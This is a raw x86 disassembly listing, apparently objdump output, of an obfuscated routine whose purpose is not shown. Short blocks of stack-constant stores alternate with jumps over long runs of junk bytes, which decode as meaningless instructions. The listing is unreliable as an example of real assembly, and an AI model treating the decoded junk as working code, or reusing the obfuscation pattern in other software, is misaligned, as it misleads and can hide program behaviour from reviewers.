  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x13]
  4111f1:	leave  
  4111f2:	jg     0x4111a4
  4111f4:	out    dx,al
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	xor    BYTE PTR [ecx+0x108d2fb5],ah
  411202:	sbb    DWORD PTR [edi-0x8bfec69],edi
  411208:	and    eax,DWORD PTR [eax]
  41120a:	adc    al,0xf6
  41120c:	or     edx,0x562a16c7
  411212:	jp     0x41121d
  411214:	fistp  WORD PTR [ebp+0x1c]
  411217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411218:	es dec eax
  41121a:	cwde   
  41121b:	xor    eax,0x67db1f6a
  411220:	and    eax,0x6cb9e5df
  411225:	cmp    ebp,edi
  411227:	bound  edi,QWORD PTR [edi]
  411229:	inc    edi
  41122a:	add    eax,0xf77144ec
  41122f:	or     eax,0x843a666c
  411234:	xchg   ecx,eax
  411235:	sub    al,0xbd
  411237:	push   edi
  411238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411239:	fild   DWORD PTR ds:0x599856c3
  41123f:	jl     0x411200
  411241:	add    DWORD PTR [ecx],ebp
  411243:	jns    0x4112a0
  411245:	loope  0x411256
  411247:	(bad)  
  411248:	popf   
  411249:	xchg   BYTE PTR [edx],cl
  41124b:	fs daa 
  41124d:	test   al,0x6f
  41124f:	dec    ecx
  411250:	in     al,dx
  411251:	lea    ebp,[ebx+0x38e1930d]
  411257:	(bad)  
  411258:	push   edi
  411259:	retf   
  41125a:	pushf  
  41125b:	das    
  41125c:	scas   al,BYTE PTR es:[edi]
  41125d:	pop    ecx
  41125e:	mov    ebp,ebp
  411260:	test   eax,0x4e11c74e
  411265:	lock jmp 0x411205
  411268:	aam    0xb4
  41126a:	lods   al,BYTE PTR ds:[esi]
  41126b:	cmc    
  41126c:	cdq    
  41126d:	mov    dh,0xc1
  41126f:	cmp    eax,0x99332762
  411274:	dec    edx
  411275:	std    
  411276:	push   ss
  411277:	dec    ebx
  411278:	xchg   edi,eax
  411279:	lds    edi,FWORD PTR [esi+0x2e]
  41127c:	(bad)
  41127f:	sub    DWORD PTR [ebx],ebx
  411281:	jnp    0x4112da
  411283:	loopne 0x41121b
  411285:	js     0x41127e
  411287:	neg    BYTE PTR [edx]
  411289:	(bad)  
  41128a:	or     eax,edi
  41128c:	fadd   QWORD PTR [ebx]
  41128e:	or     edi,DWORD PTR [ebx+0x5284350a]
  411294:	xchg   ecx,eax
  411295:	adc    DWORD PTR [ebp-0x4b92e336],esi
  41129b:	jne    0x411231
  41129d:	rcl    bh,0xf7
  4112a0:	shl    ecx,0xf9
  4112a3:	sbb    DWORD PTR [esp+ecx*2-0x50ec26b3],0x19
  4112ab:	pop    ss
  4112ac:	cli    
  4112ad:	xchg   esp,eax
  4112ae:	cli    
  4112af:	imul   DWORD PTR [eax]
  4112b1:	mov    bh,0xe5
  4112b3:	mov    eax,0xf27c0521
  4112b8:	add    dh,cl
  4112ba:	cmc    
  4112bb:	push   edx
  4112bc:	adc    al,0x2
  4112be:	idiv   ah
  4112c0:	cmp    bh,BYTE PTR [edx-0x198775a8]
  4112c6:	xorps  xmm0,XMMWORD PTR [esi]
  4112c9:	push   edi
  4112ca:	cmp    al,BYTE PTR [ecx+eiz*4-0x7a]
  4112ce:	hlt    
  4112cf:	add    BYTE PTR [edi+0x21],ch
  4112d2:	xor    eax,0x34db0ecc
  4112d7:	je     0x41127d
  4112d9:	or     DWORD PTR [edi],esi
  4112db:	push   eax
  4112dc:	fsubrp st(6),st
  4112de:	xchg   edi,eax
  4112df:	dec    ecx
  4112e0:	test   BYTE PTR [ebx+0x4f],dl
  4112e3:	(bad)  
  4112e4:	aad    0x82
  4112e6:	cs sbb al,0x31
  4112e9:	icebp  
  4112ea:	mov    eax,0x69ec72eb
  4112ef:	dec    esi
  4112f0:	dec    eax
  4112f1:	mov    cl,dl
  4112f3:	push   ds
  4112f4:	mov    dh,0x13
  4112f6:	loopne 0x41132f
  4112f8:	mov    esi,0xac073a0c
  4112fd:	ja     0x4112de
  4112ff:	push   ebp
  411300:	dec    edi
  411301:	repz mul DWORD PTR [eax+0x7f02a53d]
  411308:	shl    DWORD PTR [edx],cl
  41130a:	sbb    cl,bh
  41130c:	fiadd  DWORD PTR [ecx]
  41130e:	rcl    ecx,1
  411310:	push   0x4e
  411312:	fsub   DWORD PTR ds:0x2fb0d3d0
  411318:	fcmovne st,st(1)
  41131a:	inc    esi
  41131b:	and    al,0x49
  41131d:	jecxz  0x4112ea
  41131f:	(bad)  [edi+0x6e9705e8]
  411325:	ss push ebp
  411327:	and    al,0x7a
  411329:	out    0x6a,al
  41132b:	inc    edi
  41132c:	ja     0x411304
  41132e:	aas    
  41132f:	xlat   BYTE PTR ds:[ebx]
  411330:	or     eax,esp
  411332:	xchg   esi,eax
  411333:	nop
  411334:	or     al,0x7e
  411336:	mov    eax,0x7c9bb153
  41133b:	xor    BYTE PTR [esi-0x1db91a3f],bh
  411341:	lods   al,BYTE PTR ds:[esi]
  411342:	cmp    al,0x48
  411344:	sub    DWORD PTR [ebp-0x3c6dca5],0xcba04545
  41134e:	mov    ah,0x14
  411350:	mov    bl,0xe3
  411352:	bound  edi,QWORD PTR [ebp-0x26175389]
  411358:	dec    ebp
  411359:	daa    
  41135a:	inc    edx
  41135b:	sub    al,0x77
  41135d:	imul   BYTE PTR [esp+ebp*1]
  411360:	xor    BYTE PTR [ecx+0x4f3365a4],0x72
  411367:	cmp    esi,DWORD PTR [edx+esi*1-0x2e3b0a30]
  41136e:	shl    ah,0x86
  411371:	pop    esp
  411372:	and    al,0x7e
  411374:	bound  edi,QWORD PTR [ecx]
  411376:	mov    al,ds:0xbed9d0c4
  41137b:	rcl    BYTE PTR [eax],1
  41137d:	out    0x67,al
  41137f:	inc    edx
  411380:	(bad)  
  411381:	pop    ds
  411382:	xchg   ebx,eax
  411383:	retf   
  411384:	lock cmp ch,dl
  411387:	xchg   edi,eax
  411388:	in     eax,dx
  411389:	jmp    0x289c221f
  41138e:	mov    dl,0xa8
  411390:	js     0x4113aa
  411392:	lods   al,BYTE PTR ds:[esi]
  411393:	fdiv   QWORD PTR [ecx]
  411395:	add    DWORD PTR [edx-0xf307dd0],ebp
  41139b:	inc    esp
  41139c:	sub    eax,0x4f3845c2
  4113a1:	lahf   
  4113a2:	jo     0x41138d
  4113a4:	cmp    DWORD PTR [ebx-0x6452ef43],eax
  4113aa:	push   0x4b83eac8
  4113af:	xchg   ebp,eax
  4113b0:	jno    0x41142a
  4113b2:	js     0x411339
  4113b4:	inc    edx
  4113b5:	jmp    0x2bf7:0x2e5983d
  4113bc:	fwait
  4113bd:	shl    BYTE PTR [ebp+0x8],1
  4113c0:	push   esi
  4113c1:	push   esp
  4113c2:	or     esp,DWORD PTR [ecx-0x5be4ce1]
  4113c8:	addr16 dec esp
  4113ca:	cmp    eax,0x37684c45
  4113cf:	ss inc edx
  4113d1:	xor    DWORD PTR [eax+0x27],edx
  4113d4:	mov    ah,0x1a
  4113d6:	or     BYTE PTR [eax],0x54
  4113d9:	jp     0x4113dd
  4113db:	adc    BYTE PTR [esp+eax*4],0x40
  4113df:	jne    0x4113b3
  4113e1:	mov    ecx,0xd8dcbafb
  4113e6:	xor    DWORD PTR [ebp+0x71ad6a93],0x2b
  4113ed:	sub    ah,ah
  4113ef:	stc    
  4113f0:	jbe    0x411461
  4113f2:	adc    bl,BYTE PTR [eax+0x0]
  4113f5:	xor    DWORD PTR [edi-0x2dce0aac],0xbb43194f
  4113ff:	and    BYTE PTR [edi+0x4a],dh
  411402:	cs jns 0x4113eb
  411405:	inc    esp
  411406:	cwde   
  411407:	cmp    al,0x9b
  411409:	sbb    eax,0x8b3533ef
  41140e:	outs   dx,BYTE PTR ds:[esi]
  41140f:	fs repz jle 0x4113bb
  411413:	clc    
  411414:	xor    cl,BYTE PTR ds:0x7e009382
  41141a:	mov    ds:0x9819a6dd,al
  41141f:	add    ebp,DWORD PTR [eax+0x190ee8f2]
  411425:	add    ecx,DWORD PTR [esi-0x65]
  411428:	and    al,0xf8
  41142a:	mov    BYTE PTR [edx-0x68],bh
  41142d:	ret    0x170c
  411430:	push   esp
  411431:	adc    DWORD PTR [eax+0x46],ebx
  411434:	pop    ecx
  411435:	xor    al,0xe8
  411437:	mov    al,0x79
  411439:	in     al,dx
  41143a:	daa    
  41143b:	test   eax,0x34837024
  411440:	cdq    
  411441:	mov    bl,0xa4
  411443:	pop    eax
  411444:	or     bl,bh
  411446:	test   BYTE PTR [ebp-0x7f],al
  411449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41144a:	cwde   
  41144b:	stos   BYTE PTR es:[edi],al
  41144c:	pop    es
  41144d:	and    edx,DWORD PTR [edx+0x19980428]
  411453:	push   edi
  411454:	mov    DWORD PTR [ebp-0xb0],0x7564
  41145e:	mov    DWORD PTR [ebp-0xac],0x18cf
  411468:	mov    DWORD PTR [ebp-0xa0],0x3135
  411472:	mov    DWORD PTR [ebp-0x9c],0x568d
  41147c:	mov    DWORD PTR [ebp-0x90],0x11f2
  411486:	mov    DWORD PTR [ebp-0x8c],0x63ea
  411490:	mov    DWORD PTR [ebp-0x10],0x3066
  411497:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41149e:	push   0x7e1d
  4114a3:	jmp    0x411718
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x4c7e2188]
  4114b5:	mov    esp,DWORD PTR ds:0x187847aa
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	mov    cl,0x17
  4114c2:	cmp    ah,BYTE PTR [edi]
  4114c4:	sub    BYTE PTR [esi-0x16],cl
  4114c7:	in     eax,0x70
  4114c9:	xor    dl,BYTE PTR [ebp-0x48]
  4114cc:	repnz mov bh,0xa6
  4114cf:	mov    al,0xc0
  4114d1:	sbb    esp,0x4aa33f1a
  4114d7:	jb     0x41149c
  4114d9:	jmp    0x92b95dee
  4114de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114df:	adc    DWORD PTR [eax+0x4ed4bc45],0x38
  4114e6:	lea    edi,[eax+edx*8]
  4114e9:	add    DWORD PTR [edi-0x2a],esi
  4114ec:	sub    esi,DWORD PTR [eax+0x49dc173]
  4114f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114f3:	sbb    edi,DWORD PTR [eax+0x686f32c8]
  4114f9:	js     0x411561
  4114fb:	jns    0x411556
  4114fd:	scas   al,BYTE PTR es:[edi]
  4114fe:	pop    ebx
  4114ff:	and    al,0xad
  411501:	adc    ecx,DWORD PTR [edi+0x16]
  411504:	jo     0x4114b1
  411506:	sbb    ebp,DWORD PTR [edi-0x21eb19da]
  41150c:	ja     0x4114ad
  41150e:	out    0x2d,eax
  411510:	jnp    0x41153b
  411512:	cmp    DWORD PTR [eax-0x7c],edi
  411515:	rcl    BYTE PTR [ebx],0xa5
  411518:	lods   al,BYTE PTR ds:[esi]
  411519:	in     al,0x10
  41151b:	push   esp
  41151c:	mov    edx,0x653131c
  411521:	jg     0x411513
  411523:	inc    esi
  411524:	cwde   
  411525:	sti    
  411526:	retf   0x2d0f
  411529:	scas   al,BYTE PTR es:[edi]
  41152a:	sbb    eax,0xc676bc93
  41152f:	lds    ecx,FWORD PTR [edx-0x5d]
  411532:	inc    edx
  411533:	out    0x6b,al
  411535:	lahf   
  411536:	xchg   esp,eax
  411537:	cmp    BYTE PTR [ebx],cl
  411539:	ficomp WORD PTR [ebx+0x74f28937]
  41153f:	xchg   ebp,eax
  411540:	ins    BYTE PTR es:[edi],dx
  411541:	out    0xb6,eax
  411543:	repnz sahf 
  411545:	jg     0x4114ff
  411547:	adc    dl,BYTE PTR [eax+0x2ee4b64e]
  41154d:	sbb    ebx,DWORD PTR [ebp+eax*1+0x5b]
  411551:	pop    es
  411552:	(bad)  
  411553:	mov    ebx,0x89485b92
  411558:	cmp    al,0x64
  41155a:	jo     0x4114e8
  41155c:	xchg   edi,eax
  41155d:	loop   0x4114e6
  41155f:	xchg   edi,eax
  411560:	jp     0x4114e2
  411562:	sbb    al,dl
  411564:	or     eax,0x4975745c
  411569:	fbld   TBYTE PTR [ebp-0x33]
  41156c:	xchg   ebp,eax
  41156d:	adc    ch,cl
  41156f:	push   ds
  411570:	cmc    
  411571:	cwde   
  411572:	in     al,0x47
  411574:	jg     0x411546
  411576:	(bad)
  411579:	push   ebx
  41157a:	mov    eax,0x700bc096
  41157f:	inc    esp
  411580:	adc    BYTE PTR [ebp-0x7e],al
  411583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411584:	pop    eax
  411585:	xor    esi,DWORD PTR [esi]
  411587:	jnp    0x411578
  411589:	xor    edi,ebx
  41158b:	mov    ah,BYTE PTR [ebp-0x52]
  41158e:	mov    ds:0x22c4ee92,eax
  411593:	jmp    0x4115ae
  411595:	jle    0x411521
  411597:	dec    edi
  411598:	mov    eax,0xc74169d6
  41159d:	xor    BYTE PTR [ebp-0x4b],dl
  4115a0:	arpl   WORD PTR [edi],dx
  4115a2:	or     bh,BYTE PTR [esi+esi*8-0x7d]
  4115a6:	test   BYTE PTR [ebx+edx*4],al
  4115a9:	xor    DWORD PTR [esi+ebx*8+0x17],edx
  4115ad:	sub    al,0x10
  4115af:	mov    ecx,0x57f8ecb1
  4115b4:	sar    DWORD PTR [ebx+0x6678e58f],0xf2
  4115bb:	jno    0x4115f8
  4115bd:	xor    eax,0xf7abd892
  4115c2:	xor    DWORD PTR [ebx+0x11e64b39],ecx
  4115c8:	lods   al,BYTE PTR ds:[esi]
  4115c9:	shl    DWORD PTR [ebx],1
  4115cb:	call   0xaeed0e1d
  4115d0:	and    ebx,DWORD PTR [ebx-0xd]
  4115d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d4:	adc    eax,0x466ff9b8
  4115d9:	arpl   WORD PTR [ebp+0x1db573a5],bx
  4115df:	sti    
  4115e0:	or     bh,BYTE PTR [edx+edx*8-0x57c369d0]
  4115e7:	xchg   esi,eax
  4115e8:	sub    BYTE PTR [eax+0x69],cl
  4115eb:	daa    
  4115ec:	push   edx
  4115ed:	xlat   BYTE PTR ds:[ebx]
  4115ef:	xor    eax,0xd84cf283
  4115f4:	xchg   ebx,eax
  4115f5:	das    
  4115f6:	outs   dx,DWORD PTR ds:[esi]
  4115f7:	xchg   esi,eax
  4115f8:	retf   0x1600
  4115fb:	pop    eax
  4115fc:	ror    BYTE PTR [esi+ecx*8-0x4d83b032],1
  411603:	in     eax,dx
  411604:	inc    ecx
  411605:	es retf 
  411607:	outs   dx,DWORD PTR ds:[esi]
  411608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411609:	jne    0x411662
  41160b:	xor    dl,cl
  41160d:	pop    edx
  41160e:	outs   dx,DWORD PTR ds:[esi]
  41160f:	mov    edi,0xc4dd6f3f
  411614:	jle    0x4115ce
  411616:	sbb    eax,0xf9867469
  41161b:	out    dx,al
  41161c:	push   ecx
  41161d:	enter  0x1b67,0x89
  411621:	pop    ecx
  411622:	mov    ebp,0xca040068
  411627:	add    eax,edi
  411629:	and    ebx,ebx
  41162b:	ficomp DWORD PTR [edi-0x7f]
  41162e:	cmp    DWORD PTR [ebp-0x3ca6cf82],ebp
  411634:	xchg   ecx,eax
  411635:	push   esp
  411636:	or     bl,BYTE PTR [edi]
  411638:	or     al,0x72
  41163a:	mov    dl,0x82
  41163c:	imul   edi,DWORD PTR [ebx],0x49c827b3
  411642:	(bad)  
  411643:	out    0x4c,al
  411645:	hlt    
  411646:	add    BYTE PTR [ebp+0x10],0x7c
  41164a:	add    ebp,DWORD PTR [ecx-0x45]
  41164d:	push   cs
  41164e:	xchg   ebp,eax
  41164f:	dec    esp
  411650:	ror    DWORD PTR [edi+0x1b],cl
  411653:	ins    DWORD PTR es:[edi],dx
  411654:	std    
  411655:	adc    BYTE PTR [edi+0x74],0xd5
  411659:	call   0x9a58e6fb
  41165e:	mul    DWORD PTR [eax-0x26874a33]
  411664:	or     esp,DWORD PTR [esp+ebx*4-0x6e]
  411668:	mov    esi,0x36ad4c33
  41166d:	in     eax,0x6
  41166f:	cmp    ecx,DWORD PTR [edx+0x7c8068b5]
  411675:	dec    esi
  411676:	retf   
  411677:	mov    cl,0x67
  411679:	gs pinsrw mm5,esi,0x9f
  41167e:	ja     0x4116f6
  411680:	pop    eax
  411681:	(bad)  
  411682:	jmp    0x4116bf
  411684:	or     dh,dh
  411686:	(bad)  
  411687:	aam    0x6
  411689:	in     eax,0xa5
  41168b:	rcr    DWORD PTR [ecx],1
  41168d:	cdq    
  41168e:	and    edi,DWORD PTR [edi+0x46]
  411691:	clc    
  411692:	sub    al,0x77
  411694:	in     eax,dx
  411695:	je     0x411658
  411697:	mov    ebx,0xb648e1b2
  41169c:	cli    
  41169d:	push   eax
  41169e:	pop    esp
  41169f:	sbb    DWORD PTR [ecx+0x2dbddcc5],edi
  4116a5:	(bad)  [ecx-0x3]
  4116a8:	mov    cs,WORD PTR [ecx]
  4116aa:	add    ebp,ebp
  4116ac:	mov    esi,0x15ad8a6f
  4116b1:	sar    BYTE PTR [edx+0x4046bf6d],0x4e
  4116b8:	ret    0xc798
  4116bb:	loop   0x411688
  4116bd:	xor    BYTE PTR [ebx+edx*1],dl
  4116c0:	mov    esp,0x8e2de0f4
  4116c5:	imul   eax,DWORD PTR [ecx+ebp*1-0x5863e9c6],0xffffffbc
  4116cd:	push   es
  4116ce:	ss jge 0x411680
  4116d1:	add    al,0x19
  4116d3:	fsubr  st,st(1)
  4116d5:	clc    
  4116d6:	jl     0x41171a
  4116d8:	ins    DWORD PTR es:[edi],dx
  4116d9:	rcl    DWORD PTR ds:0x14227f8f,1
  4116df:	imul   ebp,DWORD PTR [edx-0x8],0xffffff8f
  4116e3:	xor    bl,ah
  4116e5:	call   0xd9d83e2e
  4116ea:	xchg   DWORD PTR [ebx+0x416416bb],edx
  4116f0:	pushf  
  4116f1:	data16 sbb al,0xa8
  4116f4:	cmp    al,0xe5
  4116f6:	into   
  4116f7:	fadd   st,st(4)
  4116f9:	ins    BYTE PTR es:[edi],dx
  4116fa:	cli    
  4116fb:	out    0x15,al
  4116fd:	shr    dh,0x83
  411700:	lods   al,BYTE PTR ds:[esi]
  411701:	push   ebx
  411702:	mov    ecx,0xe76a6fb9
  411707:	mov    dl,bl
  411709:	mov    eax,0xed7303c1
  41170e:	cmp    BYTE PTR [esi],dh
  411710:	inc    edx
  411711:	outs   dx,DWORD PTR ds:[esi]
  411712:	fisub  DWORD PTR [ecx]
  411714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411715:	bound  edi,QWORD PTR [edi]
  411717:	inc    edx
  411718:	mov    DWORD PTR [ebp-0x4],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0xe72caa57
  411755:	jmp    0x411715
  411757:	sahf   
  411758:	je     0x411772
  41175a:	sbb    BYTE PTR [ecx+0x14],dh
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	xor    DWORD PTR [esi],esp
  411761:	gs clc 
  411763:	and    edx,DWORD PTR [ebx+edi*4]
  411766:	mov    al,ds:0xf36faab4
  41176b:	test   BYTE PTR [eax+eiz*2-0x64a0e428],dh
  411772:	xchg   esi,eax
  411773:	dec    ebx
  411774:	jmp    0x411732
  411776:	ss fst st(2)
  411779:	(bad)  
  41177a:	and    eax,0xfec95a24
  41177f:	mov    cl,0x96
  411781:	add    DWORD PTR [ebx+0x0],edi
  411784:	addr16 pop eax
  411786:	inc    eax
  411787:	cdq    
  411788:	and    al,0xa
  41178a:	xchg   edx,eax
  41178b:	inc    edx
  41178c:	mov    dh,0xa8
  41178e:	repz out dx,al
  411790:	ja     0x41180c
  411792:	call   0x2337:0xaf652084
  411799:	xor    edx,ebp
  41179b:	retf   
  41179c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41179d:	arpl   WORD PTR [edx-0x4ac853a4],dx
  4117a3:	imul   edi,edi,0x2d67e6c1
  4117a9:	sbb    eax,0xc774477b
  4117ae:	(bad)  
  4117af:	das    
  4117b0:	retf   0xbd59
  4117b3:	mov    ebx,0x84274d37
  4117b8:	fld    DWORD PTR [edi-0x37]
  4117bb:	fst    QWORD PTR [ebp+0x36]
  4117be:	in     al,dx
  4117bf:	(bad)  
  4117c0:	stos   BYTE PTR es:[edi],al
  4117c1:	add    ebp,DWORD PTR [edx+0x74]
  4117c4:	std    
  4117c5:	mov    al,0x94
  4117c7:	je     0x411770
  4117c9:	out    dx,al
  4117ca:	lea    edx,[edi-0x12db3763]
  4117d0:	pop    es
  4117d1:	jo     0x41178a
  4117d3:	adc    eax,0x48d45bd7
  4117d8:	xchg   BYTE PTR [edi+edi*2-0x34],bl
  4117dc:	cmp    DWORD PTR [ebx-0x59],ebx
  4117df:	popa   
  4117e0:	add    BYTE PTR [ecx-0x26de4f70],dh
  4117e6:	inc    edx
  4117e7:	jmp    0x411774
  4117e9:	inc    esi
  4117ea:	bound  edx,QWORD PTR [ecx]
  4117ec:	xchg   ecx,eax
  4117ed:	sub    eax,0x9a100bec
  4117f2:	and    ebx,esi
  4117f4:	pop    esp
  4117f5:	shr    DWORD PTR fs:[edx],1
  4117f8:	add    al,BYTE PTR [eax-0x76]
  4117fb:	sub    bh,BYTE PTR [esp+ecx*4]
  4117fe:	mov    cl,0xb7
  411800:	mov    al,ds:0x75ce7c14
  411805:	jae    0x4117e3
  411807:	scas   al,BYTE PTR es:[edi]
  411808:	jmp    0x411884
  41180a:	push   0xfc1c1b92
  41180f:	sbb    eax,0x5b590033
  411814:	jmp    0x41179a
  411816:	icebp  
  411817:	iret   
  411818:	ja     0x411805
  41181a:	popa   
  41181b:	aam    0x18
  41181d:	shr    DWORD PTR [ecx-0x11],cl
  411820:	jno    0x411832
  411822:	mov    BYTE PTR [edx],ah
  411824:	mov    eax,ds:0xdd814d4c
  411829:	loopne 0x411818
  41182b:	jmp    0x808050c0
  411830:	pusha  
  411831:	mov    edx,ebx
  411833:	push   ecx
  411834:	mov    ds:0x366c1b39,eax
  411839:	std    
  41183a:	sti    
  41183b:	xor    ch,BYTE PTR [ebp+0x313e81c2]
  411841:	xchg   edx,eax
  411842:	sbb    ch,BYTE PTR [eax+ebx*4+0x67]
  411846:	cwde   
  411847:	icebp  
  411848:	stos   DWORD PTR es:[edi],eax
  411849:	inc    esp
  41184a:	add    edx,eax
  41184c:	mov    esp,ds
  41184e:	add    cl,bl
  411850:	jnp    0x41189e
  411852:	and    BYTE PTR [edx+edi*1-0x45],dl
  411856:	test   DWORD PTR [edx],edx
  411858:	imul   BYTE PTR [ebx-0x7c96c42d]
  41185e:	call   0x5a53:0x71a5c3f0
  411865:	in     al,0x65
  411867:	sbb    ah,BYTE PTR [esi-0x407c129d]
  41186d:	add    eax,0x40313440
  411872:	adc    al,BYTE PTR [eax-0x6d]
  411875:	jle    0x4118b0
  411877:	push   ss
  411878:	int3   
  411879:	xchg   ecx,eax
  41187a:	popf   
  41187b:	dec    BYTE PTR [eax+ecx*2+0x3823dae0]
  411882:	xchg   ecx,eax
  411883:	jmp    0x4118b0
  411885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411886:	int3   
  411887:	add    edi,esp
  411889:	(bad)  
  41188a:	xchg   ecx,eax
  41188b:	fwait
  41188c:	shl    BYTE PTR [edi],cl
  41188e:	lea    edi,[ecx+0x30bf394d]
  411894:	jmp    0x7fce:0x7cfd9b0b
  41189b:	shl    al,0x85
  41189e:	stos   DWORD PTR es:[edi],eax
  41189f:	fdiv   QWORD PTR [edi-0x58]
  4118a2:	in     eax,0xd4
  4118a4:	aaa    
  4118a5:	sub    eax,DWORD PTR [ebx+0x6a741621]
  4118ab:	(bad)  
  4118ac:	jp     0x41188c
  4118ae:	cmp    ebx,DWORD PTR [edi+0x5d]
  4118b1:	test   eax,0x5936dcb
  4118b6:	inc    edi
  4118b7:	cli    
  4118b8:	ror    BYTE PTR [ebx],1
  4118ba:	xlat   BYTE PTR ds:[ebx]
  4118bb:	loop   0x411871
  4118bd:	imul   DWORD PTR [eax+esi*2+0xc]
  4118c1:	xchg   esp,eax
  4118c2:	push   ss
  4118c3:	out    dx,eax
  4118c4:	mov    bl,0xa3
  4118c6:	push   edi
  4118c7:	and    BYTE PTR ds:0x9a67aa20,ch
  4118cd:	xchg   ebx,eax
  4118ce:	and    DWORD PTR [edx+0x61],esp
  4118d1:	dec    ebp
  4118d2:	inc    ecx
  4118d3:	dec    ebx
  4118d4:	jp     0x4118c5
  4118d6:	(bad)  
  4118d7:	(bad)  
  4118d8:	test   eax,0x2e529776
  4118dd:	jo     0x411957
  4118df:	mov    edi,0xf41188e4
  4118e4:	or     DWORD PTR [ebx-0x9ac1fdd],ebp
  4118ea:	mov    ah,BYTE PTR [edi-0x7b]
  4118ed:	pusha  
  4118ee:	pop    ecx
  4118ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f0:	fnstsw WORD PTR [edi]
  4118f2:	push   ds
  4118f3:	jnp    0x4118b3
  4118f5:	les    esp,FWORD PTR [esi+0xc50efe4]
  4118fb:	mov    ah,0x80
  4118fd:	pop    ebp
  4118fe:	inc    ebp
  4118ff:	xchg   BYTE PTR [eax-0x6bd380bf],ch
  411905:	outs   dx,DWORD PTR ds:[esi]
  411906:	ja     0x4118a2
  411908:	(bad)  
  411909:	les    esp,FWORD PTR [edx]
  41190b:	retf   0xc05
  41190e:	mov    WORD PTR [eax],?
  411910:	in     eax,0x2
  411912:	add    DWORD PTR [ecx+ebx*1-0x1688e62c],ebp
  411919:	pusha  
  41191a:	lods   al,BYTE PTR ds:[esi]
  41191b:	add    DWORD PTR [esi],ebp
  41191d:	cs jmp 0xf03a:0xe987ea1f
  411925:	pushf  
  411926:	pop    eax
  411927:	in     eax,0xd6
  411929:	add    eax,0xc7172164
  41192e:	push   ebx
  41192f:	shl    ebx,cl
  411931:	inc    ebx
  411932:	sbb    eax,ecx
  411934:	push   0x6
  411936:	jbe    0x4118df
  411938:	cwde   
  411939:	cmp    ah,BYTE PTR [esi]
  41193b:	mov    gs,WORD PTR [edx+0x629b4626]
  411941:	push   0x13
  411943:	les    edi,FWORD PTR [esi-0x62]
  411946:	fwait
  411947:	add    al,0xa8
  411949:	(bad)  
  41194b:	push   edx
  41194c:	push   DWORD PTR [edx]
  41194e:	ins    DWORD PTR es:[edi],dx
  41194f:	outs   dx,BYTE PTR ds:[esi]
  411950:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411952:	xchg   esp,eax
  411953:	fs mov ebx,0x1c1890b3
  411959:	adc    DWORD PTR ds:0x1975573e,edx
  41195f:	addr16 enter 0x6e1a,0x16
  411964:	(bad)
  411969:	imul   esi,DWORD PTR [esi+0x6eea6435],0x15
  411970:	xchg   edi,eax
  411971:	mov    cl,0xb6
  411973:	lds    eax,FWORD PTR [ebx+ecx*4+0x28]
  411977:	dec    ecx
  411978:	adc    BYTE PTR [eax+0x7293649b],0x31
  41197f:	ss test al,0xa1
  411982:	mov    edi,0xf090bb73
  411987:	adc    cl,BYTE PTR [esi-0x56]
  41198a:	xor    DWORD PTR [edi-0x7d4a5c0e],0xd31bebe4
  411994:	sti    
  411995:	daa    
